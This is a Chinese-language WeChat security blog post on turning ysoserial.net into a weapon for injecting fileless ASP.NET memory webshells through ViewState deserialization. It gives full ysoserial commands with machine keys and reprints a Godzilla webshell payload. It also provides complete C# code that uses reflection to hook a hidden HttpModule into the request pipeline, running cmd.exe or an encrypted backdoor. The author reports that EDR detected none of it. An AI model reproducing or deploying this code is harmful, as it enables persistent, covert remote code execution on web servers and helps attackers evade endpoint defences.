#  寻找Http Module内存马并ysoserial.net武器化

原创 侠盗鲁平 [ Security丨Art ](javascript:void\(0\);)

**Security丨Art** ![]()

微信号 gh_5fa7bf90b576

功能介绍 网络安全的闲篇扯淡与第Ｎ艺术的外行吐槽

____

___发表于_

收录于合集

## ysoserial.net加载过程

ysoserial.net使用Ghostwebshell命令如下

    
    
    .\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "GhostWebshell.cs;System.dll;System.Web.dll;Microsoft.AspNet.FriendlyUrls.dll" --decryptionalg="AES" --decryptionkey="51FE611365277B07911521B7CAFE3766751D16C33D96242F0E63E93FB102BCE2" --validationalg="HMACSHA256" --validationkey="BF579EF0E9F0C85277E75726BFC9D0260FADE8DE2864A583484AA132944F602D" --path="/login.aspx" --apppath="/" --isdebug  
    

  * 使用ActivitySurrogateSelectorFromFile gadget
  * LosFormatter一般用于序列化存储视图流状态，多用于Web窗体，如ViewState。LosFormatter封装在System.Web.dll中，命名空间为System.Web.UI，使用LosFormatter反序列化不信任的数据会造成RCE
  * 如有反序列化source点，可以用binaryformatter序列化格式
  * ````C:\CoolTools\ysoserial.net\ExploitClass\GhostWebShell.cs;```是文件地址，后面跟的是编译文件所需的dll

nuget拉取项目依赖之后加入命令参数进行调试

![]()

项目入口在Program.cs的main函数中

![]()

紧接着获取当前程序域的所有加载的程序集类型

    
    
    GPT time:  
    `AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes())` 是一段代码，用于获取当前应用程序域（AppDomain）中加载的所有程序集的类型。  
      
    在 .NET Framework 中，`AppDomain` 是一个应用程序的隔离边界，它包含了应用程序在运行时所需的各种资源，例如程序集、配置信息和安全策略。每个应用程序通常都有一个默认的应用程序域（CurrentDomain），可以通过 `AppDomain.CurrentDomain` 属性来访问。  
      
    `GetAssemblies()` 方法是 `AppDomain` 类的一个成员方法，用于获取当前应用程序域中加载的所有程序集。它返回一个 `Assembly[]` 数组，包含了当前应用程序域中的所有程序集。  
      
    `SelectMany(s => s.GetTypes())` 则是对获取到的程序集进行处理的一部分。`SelectMany()` 是 LINQ 扩展方法，用于将每个程序集中的类型集合合并为一个平面的序列。`s => s.GetTypes()` 是一个 lambda 表达式，表示对每个程序集 `s` 调用 `GetTypes()` 方法来获取该程序集中定义的所有类型。  
      
    因此，`AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes())` 这段代码的最终结果将是一个包含当前应用程序域中加载的所有程序集中定义的所有类型的序列（IEnumerable<Type>）。  
      
    通过这段代码，你可以遍历当前应用程序域中的所有类型，并对它们进行各种操作，例如反射、实例化、属性访问等。这对于一些需要动态处理和探索类型的场景非常有用，比如插件系统、反射性能分析等。  
    

![]()

接着根据条件筛选出加载器和插件以及格式

![]()

![]()

![]()

紧接着根据提供的gadget参数添加链

![]()

添加序列化格式

![]()

设置generetor

![]()

接下来经过一些合法性判断

开始初始化generetor

![]()

解析参数，让我们进入ActivitySurrogateSelectorFromFileGenerator看一下

![]()

首先关闭活动代理选择器类型检查的功能

![]()

ActivitySurrogateSelector为不可序列化的类提供了包装器，微软为了修复这个问题添加了类型检查功能，这里将它关了

可以看到GhostWebshell中的类未标记可被序列化

![]()

解析参数后用编译器将代码编译并返回结果byte[]，并将结果根据提供的序列化格式参数进行序列化并返回结果

![]()

最后将base64后的结果输出

![]()

![]()

接着转过头看

GhostWebshell，关键的语句如下

![]()

将自定义的虚拟路径进行注册

通过viewstate请求ghostewbshell内存马，默认4.7.2版本，开启friendlyurls

![]()

ban掉web.config中的类型检测

![]()

注入成功，请求生成

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET
Files\vs\d06db0ae\5938043f\App_Web_1.aspx.f6cd8fc2.z-abnbdq.dll`

以及`App_Web_ghostfile485.aspx.f6cd8fc2.cet1f-sj.0.cs`等文件

![]()

  

使用edr进行检测均未发现报毒

这里可以看到他本身还是添加一个新的vp路径把aspx放进去，访问后会生成dll方便持久化控制，如果只是viewstate中的代码，在一个请求的生命周期结束后，就会gg，这就是下面哥斯拉的这个攻击成功后很快下线的原因，如果要持续化，要把生成的payload放在左边添加数据中反复请求

    
    
    class d  
    {  
        public d()  
        {  
            System.Web.HttpContext Context = System.Web.HttpContext.Current;  
            Context.Server.ClearError();  
            Context.Response.Clear();  
            try  
            {  
                string key = "3c6e0b8a9c15224a";  
                string pass = "pas";  
                string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", "");  
                byte[] data = System.Convert.FromBase64String(Context.Request[pass]);  
                data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);  
                if (Context.Session["payload"] == null)  
                {  
                    Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });  
                }  
                else  
                {  
                    System.IO.MemoryStream outStream = new System.IO.MemoryStream();  
                    object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY");  
                    o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString();  
                    byte[] r = outStream.ToArray();  
                    Context.Response.Write(md5.Substring(0, 16));  
                    Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16));  
                }  
            }  
            catch (System.Exception) { }  
            Context.Response.Flush();  
            Context.Response.End();  
        }  
    }  
    

## 改造内存马

### Route

修改项目Framework版本

![]()

首先为项目添加mvc包支持

![]()

修改文件熟悉

![]()

    
    
    -p ViewState -g ActivitySurrogateSelectorFromFile -c "RouteWebshell.cs;System.dll;System.Web.dll;System.Web.Mvc.dll" --decryptionalg="AES" --decryptionkey="51FE611365277B07911521B7CAFE3766751D16C33D96242F0E63E93FB102BCE2" --validationalg="HMACSHA256" --validationkey="BF579EF0E9F0C85277E75726BFC9D0260FADE8DE2864A583484AA132944F602D" --path="/login.aspx" --apppath="/" --isdebug  
    

比较麻烦的的一点是exploitclass和ysoserial属于两个不同的项目，每次修改代码之后记得要build一次，不然运行ysoerial不会编译新的代码

这里有个和蚁剑作者写的不同的地方

 **使用web forms框架的项目，通常不用mvc的filter去做权限控制**

 **使用mvc的通常也不用viewstate去控制页面状态**

### Http Module

#### http module介绍

HttpHandler（HTTP处理程序）和HttpModule（HTTP模块）是ASP.NET处理HTTP请求的重要组件

首先我们来看一下ASP.NET处理web请求的流程~~~~

![]()

可以看到在经过http module对请求的处理后才进入handler对请求做进一步的处理

Http请求像是一个旅客身上带着行李拿着票来搭火车.

HttpHandler 是火车的终点站.HttpModule 是火车中途停靠的各站.

要查看有哪写IHttpModule或IHttpHandler被注册可以看applicationhost.config

路径：C:\Users[user]\Documents\IISExpress\config\applicationhost.config

#### 创建一个http module

首先创建一个http module

    
    
    using System;  
    using System.Web;  
    public class HelloWorldModule : IHttpModule  
    {  
        public HelloWorldModule()  
        {  
        }  
      
        public String ModuleName  
        {  
            get { return "HelloWorldModule"; }  
        }  
      
        // In the Init function, register for HttpApplication   
        // events by adding your handlers.  
        public void Init(HttpApplication application)  
        {  
            application.BeginRequest +=   
                (new EventHandler(this.Application_BeginRequest));  
            application.EndRequest +=   
                (new EventHandler(this.Application_EndRequest));  
        }  
      
        private void Application_BeginRequest(Object source,   
             EventArgs e)  
        {  
        // Create HttpApplication and HttpContext objects to access  
        // request and response properties.  
            HttpApplication application = (HttpApplication)source;  
            HttpContext context = application.Context;  
            string filePath = context.Request.FilePath;  
            string fileExtension =   
                VirtualPathUtility.GetExtension(filePath);  
            if (fileExtension.Equals(".aspx"))  
            {  
                context.Response.Write("<h1><font color=red>" +  
                    "HelloWorldModule: Beginning of Request" +  
                    "</font></h1><hr>");  
            }  
        }  
      
        private void Application_EndRequest(Object source, EventArgs e)  
        {  
            HttpApplication application = (HttpApplication)source;  
            HttpContext context = application.Context;  
            string filePath = context.Request.FilePath;  
            string fileExtension =   
                VirtualPathUtility.GetExtension(filePath);  
            if (fileExtension.Equals(".aspx"))  
            {  
                context.Response.Write("<hr><h1><font color=red>" +  
                    "HelloWorldModule: End of Request</font></h1>");  
            }  
        }  
      
        public void Dispose() { }  
    }  
    

然后再web.config中注册

    
    
    <configuration>  
      <system.web>  
        <httpModules>  
          <add name="HelloWorldModule" type="HelloWorldModule"/>  
         </httpModules>  
      </system.web>  
    </configuration>  
    

那么我们能动态修改web.config并加载我们的module，但是修改核心配置文件动静太大了

    
    
            Configuration config = WebConfigurationManager.OpenWebConfiguration("~");  
      
    // 获取系统.web/httpModules 节点  
            HttpModulesSection httpModulesSection = (HttpModulesSection)config.GetSection("system.web/httpModules");  
      
    // 创建自定义模块的配置元素  
            HttpModuleAction moduleAction = new HttpModuleAction("CustomModule", "YourNamespace.CustomModule, YourAssembly");  
      
    // 将自定义模块的配置元素添加到 httpModulesSection  
            httpModulesSection.Modules.Add(moduleAction);  
      
    // 保存配置更改  
            config.Save();  
    

#### module init

接下来看一下写在web.config里面的module是在哪里注册的

就在Httpapplication.cs中

https://referencesource.microsoft.com/#System.Web/HttpApplication.cs,bdaceac545ce071d,references

![]()

可以看到读取配置文件并将在`web.config`文件中注册的module放在`HttpModuleCollection`类型的集合中并传递给属性`_moduleCollection`

接下来看一下`InitModulesCommon`方法做了什么操作

https://referencesource.microsoft.com/#System.Web/HttpApplication.cs,44cc1113dad08b6d

![]()

  

可以看到就是循环执行每个`module`的`init`方法

这里看下我们的自定义`module`的`init`方法，可以看到就是把我们的事件处理方法包装成`EventHandler`并挂载到`httpapplication`实例的事件上。

所以一开始的思路是

  * 把我们的自定义module通过反射的方式添加到_moduleCollection
  * 执行InitModulesCommon方法

    
    
    FieldInfo moduleCollectionField = httpApplicationType.GetField("_moduleCollection", BindingFlags.Instance | BindingFlags.NonPublic);   
            object moduleCollectionValue = moduleCollectionField.GetValue(httpApplicationInstance);  
            MethodInfo addMethod = moduleCollectionValue.GetType().GetMethod("AddModule", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);  
            addMethod.Invoke(moduleCollectionValue, parameters);  
    

这里我们使用HttpModuleCollection的AddModule方法向集合添加module

https://referencesource.microsoft.com/#System.Web/HttpModuleCollection.cs,3e6ca3076722037d

![]()

  

    
    
    MethodInfo initMethod = httpApplicationType.GetMethod("InitModulesCommon",System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);  
    initMethod.Invoke(httpApplicationInstance, null);  
    

但是报错显示在Httpapplication初始化之后校验方法的InvocationFlags标志位

https://referencesource.microsoft.com/#mscorlib/system/reflection/fieldinfo.cs,533cc59fbe48130c

![]()

  

https://referencesource.microsoft.com/#mscorlib/system/reflection/methodbase.cs,22ea3e7b5798f250

![]()

  

不能再执行init方法

尝试反射修改方法的属性值

    
    
    PropertyInfo invocationFlagsProperty = initMethod.GetType().GetProperty("InvocationFlags", BindingFlags.Instance | BindingFlags.NonPublic);  
            INVOCATION_FLAGS newFlagsValue1 = INVOCATION_FLAGS.INVOCATION_FLAGS_UNKNOWN;  
            invocationFlagsProperty.SetValue(initMethod, newFlagsValue1);  
    

 **但该属性值没有set方法**

上面的方法失败了，开始思考微软是否会有支持在不修改web.config的情况下动态添加module的方法，于是找到了LegacyModuleRegistrar

    
    
    Type legacyModuleRegistrarType = typeof(DynamicModuleUtility); // 将 ContainingType 替换为包含 LegacyModuleRegistrar 类的实际类型  
            Type legacyModuleRegistrarNestedType = legacyModuleRegistrarType.GetNestedType("LegacyModuleRegistrar", BindingFlags.NonPublic);  
            if (legacyModuleRegistrarNestedType != null)  
            {  
                object legacyModuleRegistrarInstance = Activator.CreateInstance(legacyModuleRegistrarNestedType);  
    

但是需要在头部添加标签

    
    
    [assembly: PreApplicationStartMethod(typeof(WebApplication2.PreApplicationStartCode), "PreStart")]   
    

很遗憾这仍然不是通过一个payload就能实现的操作

在如何执行init方法这里卡了几天，想到我们能不能 **直接执行init，只要把我们的方法挂到事件上就可以**
,在这个过程中我又发现了对httpapplication是否已经初始化的校验

![]()

  

通过反射进行修改绕过

    
    
    FieldInfo initField = httpApplicationType.GetField("_initInternalCompleted", BindingFlags.Instance | BindingFlags.NonPublic);   
            initField.SetValue(httpApplicationInstance,false);  
            //初始化 module  
            customModule.Init(this.Context.ApplicationInstance);  
            initField.SetValue(httpApplicationInstance,true);  
    

然而当我们去请求的时候，发现我们挂载到事件上的方法并没有执行。

#### 事件挂载

跟踪挂载过程发现调用私有方法HttpApplication.AddSyncEventHookup

![]()

尝试反射修改掉IsContainerInitalizationAllowed，然后发现无法绕过的地方，在读取moduleContainer过程中我们的key为Global.asax，且基于ASP.NET安全机制无法通过反射修改。

于是决定通过反射的方式，直接完成方法功能

首先反射调用Addhandler

    
    
     PropertyInfo eventsProperty = httpApplicationType  
              .GetProperty("Events", BindingFlags.Instance | BindingFlags.NonPublic);  
            object eventsInstance = eventsProperty.GetValue(httpApplicationInstance);  
            MethodInfo addHandlerMethod = eventsInstance.GetType()  
              .GetMethod("AddHandler");  
    

通过HttpApplication的方法，获取一个初始化过程中已经加载了的module container,这里选的是AspNetFilterModule

    
    
            MethodInfo getModuleContainerMethod = httpApplicationType.GetMethod("GetModuleContainer", BindingFlags.Instance | BindingFlags.NonPublic);  
            object[] parametersCurrentModuleCollectionKey = new object[] { "AspNetFilterModule" }; // 根据方法参数进行适当调整  
            object moduleContainer = getModuleContainerMethod.Invoke(httpApplicationInstance, parametersCurrentModuleCollectionKey);  
    

第三步通过反射调用构造函数创建step实例

    
    
    Type syncEventExecutionStepType = httpApplicationType.GetNestedType("SyncEventExecutionStep", BindingFlags.NonPublic);  
            ConstructorInfo constructor = syncEventExecutionStepType.GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance, null, new Type[] { typeof(System.Web.HttpApplication), typeof(EventHandler) }, null);  
            object step = constructor.Invoke(new object[] { httpApplicationInstance, c });  
    

最终调用AddEvent方法，将我们的step和RequestNotification类型的事件绑到一起，添加到我们的moduleContainer中

    
    
    MethodInfo getAddEventMethod = moduleContainer.GetType().GetMethod("AddEvent",BindingFlags.Instance | BindingFlags.NonPublic);  
            object[] AddEventMethodPs = { RequestNotification.LogRequest, false, step };  
            getAddEventMethod.Invoke(moduleContainer, AddEventMethodPs);  
    

这里是把事件处理方法绑定到AspNetFilterModule中的RequestNotification.LogRequest事件上，其他的module和事件都可以绑定，但是要考虑触发时机，这里选择的点是因为在HttpApplicaiton初始化过程中执行的
BuildSteps方法中提到了一系列事件方法绑定，方便注入内存马后触发事件验证是否成功注入。

![]()

在vs中ASP.NET web forms默认加载module如下

    
    
    OutputCache  
    Session  
    WindowsAuthentication  
    FormsAuthentication  
    DefaultAuthentication  
    RoleManager  
    UrlAuthorization  
    FileAuthorization  
    AnonymousIdentification  
    Profile  
    UrlMappingsModule  
    ServiceModel-4.0  
    UrlRoutingModule-4.0  
    ScriptModule-4.0  
    __DynamicModule_Microsoft.AspNet.FriendlyUrls.FriendlyUrlsModule, Microsoft.AspNet.FriendlyUrls, Version=1.0.2.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35_4c981331-8571-4eda-a0b1-c8a08b21b919  
    __DynamicModule_Microsoft.WebTools.BrowserLink.Runtime.Tracing.PageInspectorHttpModule, Microsoft.WebTools.BrowserLink.Runtime, Version=17.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a_071bf808-e9ff-4716-9075-330cc6c7d2bf  
    __DynamicModule_System.Web.WebPages.WebPageHttpModule, System.Web.WebPages, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35_61a71c81-26f2-4327-8ed9-512c10656f3e  
    __DynamicModule_System.Web.Optimization.BundleModule, System.Web.Optimization, Version=1.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35_27f7cfdc-74e2-4862-  
    

最终完整代码如下

    
    
    public class F  
        {  
            public class CustomModule : System.Web.IHttpModule  
            {  
                public void Init(System.Web.HttpApplication httpApp)  
                {  
                      
                }  
      
                // Issues a custom begin request event.  
                  
                public void OnEnter(System.Object sender, System.EventArgs e)  
                {  
      
                    System.Web.HttpApplication httpApp = sender as System.Web.HttpApplication;  
                      
                    System.Diagnostics.Process p2 = new System.Diagnostics.Process();  
                    p2.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";  
                    p2.StartInfo.Arguments = "/c whoami /priv > C:\\Windows\\Temp1.txt";  
                    p2.StartInfo.UseShellExecute = false;  
                    p2.StartInfo.RedirectStandardError = true;  
                    p2.StartInfo.RedirectStandardOutput = true;  
                    p2.Start();  
      
                }  
      
      
                public void Dispose()  
                {  
                }  
            }  
            public F()   
            {  
                System.Web.HttpContext Context = System.Web.HttpContext.Current;  
                Context.Server.ClearError();  
                Context.Response.Clear();  
                try   
                {  
                    System.Web.HttpApplication httpApplicationInstance = System.Web.HttpContext.Current.ApplicationInstance;  
                    System.Type httpApplicationType = typeof(System.Web.HttpApplication);  
                    string name = "CustomModule"; // 模块名称  
                    CustomModule customModule = new CustomModule(); // 自定义的 IHttpModule 实例  
                    object[] parameters = new object[] { name, customModule };  
                    System.EventHandler c = new System.EventHandler(customModule.OnEnter);  
                      
                    System.Reflection.PropertyInfo eventsProperty = httpApplicationType  
                        .GetProperty("Events", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);  
                    object eventsInstance = eventsProperty.GetValue(httpApplicationInstance);  
                    System.Reflection.MethodInfo addHandlerMethod = eventsInstance.GetType()  
                        .GetMethod("AddHandler");  
              
                    object[] parametersAddHandler = new object[] { new object(), c }; // 根据方法参数进行适当调整  
                    addHandlerMethod.Invoke(eventsInstance, parametersAddHandler);  
                    // 调用 GetModuleContainer 方法  
                    System.Reflection.MethodInfo getModuleContainerMethod = httpApplicationType.GetMethod("GetModuleContainer", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);  
                    object[] parametersCurrentModuleCollectionKey = new object[] { "AspNetFilterModule" }; // 根据方法参数进行适当调整  
                    object moduleContainer = getModuleContainerMethod.Invoke(httpApplicationInstance, parametersCurrentModuleCollectionKey);  
                      
                    System.Type syncEventExecutionStepType = httpApplicationType.GetNestedType("SyncEventExecutionStep", System.Reflection.BindingFlags.NonPublic);  
                    System.Reflection.ConstructorInfo constructor = syncEventExecutionStepType.GetConstructor(System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance, null, new System.Type[] { typeof(System.Web.HttpApplication), typeof(System.EventHandler) }, null);  
                    object step = constructor.Invoke(new object[] { httpApplicationInstance, c });  
                      
                    System.Reflection.MethodInfo getAddEventMethod = moduleContainer.GetType().GetMethod("AddEvent",System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);  
                    object[] AddEventMethodPs = { System.Web.RequestNotification.LogRequest, false, step };  
                    getAddEventMethod.Invoke(moduleContainer, AddEventMethodPs);  
       
                }catch(System.Exception e)  
                {  
                    Context.Response.Write(e.Message);  
                }  
      
                Context.Response.Flush();  
                Context.Response.End();  
              
            }  
              
              
      
    }  
      
    

选择RequestNotification.LogRequest事件的原因是因为事件发生位置靠后，然而实战中发现LogRequest发生时，当前请求处理已经结束，当前context实例的session实例为null。所以选择Session
module的AcquireRequestState事件(在session实例初始化后和垃圾回收前)，在不修改哥斯拉原本payload位置的情况下完成内存马功能

    
    
    public class F  
        {  
            public class CustomModule : System.Web.IHttpModule  
            {  
                public void Init(System.Web.HttpApplication httpApp)  
                {  
                }  
                // Issues a custom begin request event.  
                public void OnEnter(System.Object sender, System.EventArgs e)  
                {  
                    System.Web.HttpContext context = ((System.Web.HttpApplication)sender).Context;  
                    context.Server.ClearError();  
                    context.Response.Clear();  
                    string kk = "3c6e0b8a9c15224a";  
                    string pp = "pas";  
                    string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pp + kk))).Replace("-", "");  
                    byte[] data = System.Convert.FromBase64String(context.Request[pp]);  
                    //context.Response.Write(context.Request[pp]);  
                    data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(kk), System.Text.Encoding.Default.GetBytes(kk)).TransformFinalBlock(data, 0, data.Length);  
                    if (context.Session["payload"] == null)  
                    {  
                        context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });  
                    }  
                    else  
                    {  
                        System.IO.MemoryStream outStream = new System.IO.MemoryStream();  
                        object o = ((System.Reflection.Assembly)context.Session["payload"]).CreateInstance("LY");  
                        o.Equals(context); o.Equals(outStream); o.Equals(data); o.ToString();  
                        byte[] r = outStream.ToArray();  
                        context.Response.Write(md5.Substring(0, 16));  
                        context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(kk), System.Text.Encoding.Default.GetBytes(kk)).TransformFinalBlock(r, 0, r.Length))); context.Response.Write(md5.Substring(16));  
                    }  
                      
                    context.Response.Flush();  
                    context.Response.End();  
      
                }  
                public void Dispose()  
                {  
                }  
            }  
            public F()   
            {  
                System.Web.HttpContext Context = System.Web.HttpContext.Current;  
                Context.Server.ClearError();  
                Context.Response.Clear();  
                try   
                {  
                    System.Web.HttpApplication httpApplicationInstance = System.Web.HttpContext.Current.ApplicationInstance;  
                    System.Type httpApplicationType = typeof(System.Web.HttpApplication);  
                    string name = "CustomModule"; // 模块名称  
                    CustomModule customModule = new CustomModule(); // 自定义的 IHttpModule 实例  
                    object[] parameters = new object[] { name, customModule };  
                    System.EventHandler c = new System.EventHandler(customModule.OnEnter);  
                      
                    System.Reflection.PropertyInfo eventsProperty = httpApplicationType  
                        .GetProperty("Events", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);  
                    object eventsInstance = eventsProperty.GetValue(httpApplicationInstance);  
                    System.Reflection.MethodInfo addHandlerMethod = eventsInstance.GetType()  
                        .GetMethod("AddHandler");  
              
                    object[] parametersAddHandler = new object[] { new object(), c }; // 根据方法参数进行适当调整  
                    addHandlerMethod.Invoke(eventsInstance, parametersAddHandler);  
                    // 调用 GetModuleContainer 方法  
                    System.Reflection.MethodInfo getModuleContainerMethod = httpApplicationType.GetMethod("GetModuleContainer", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);  
                    object[] parametersCurrentModuleCollectionKey = new object[] { "AspNetFilterModule" }; // 根据方法参数进行适当调整  
                    object moduleContainer = getModuleContainerMethod.Invoke(httpApplicationInstance, parametersCurrentModuleCollectionKey);  
                      
                    System.Type syncEventExecutionStepType = httpApplicationType.GetNestedType("SyncEventExecutionStep", System.Reflection.BindingFlags.NonPublic);  
                    System.Reflection.ConstructorInfo constructor = syncEventExecutionStepType.GetConstructor(System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance, null, new System.Type[] { typeof(System.Web.HttpApplication), typeof(System.EventHandler) }, null);  
                    object step = constructor.Invoke(new object[] { httpApplicationInstance, c });  
                      
                    System.Reflection.MethodInfo getAddEventMethod = moduleContainer.GetType().GetMethod("AddEvent",System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);  
                    object[] AddEventMethodPs = { System.Web.RequestNotification.LogRequest, false, step };  
                    getAddEventMethod.Invoke(moduleContainer, AddEventMethodPs);  
                }catch(System.Exception e)  
                {  
                    Context.Response.Write(e.Message);  
                }  
                  
                Context.Response.Flush();  
                Context.Response.End();  
              
            }  
              
              
      
    }  
    

ysoserial命令如下

    
    
    ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "FilterWebshell.cs;System.dll;System.Web.dll" --decryptionalg="AES" --decryptionkey="51FE611365277B07911521B7CAFE3766751D16C33D96242F0E63E93FB102BCE2" --validationalg="HMACSHA256" --validationkey="BF579EF0E9F0C85277E75726BFC9D0260FADE8DE2864A583484AA132944F602D" --path="/login.aspx" --apppath="/" --isdebug  
    

生成payload

![]()

将payload注入

![]()

填写任意url，需多点几次验证，确定请求可触发事件（一开始几次会提示初始化失败）

![]()

成功注入及免杀

![]()

  

## 参考链接

https://isdaniel.github.io/

  

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

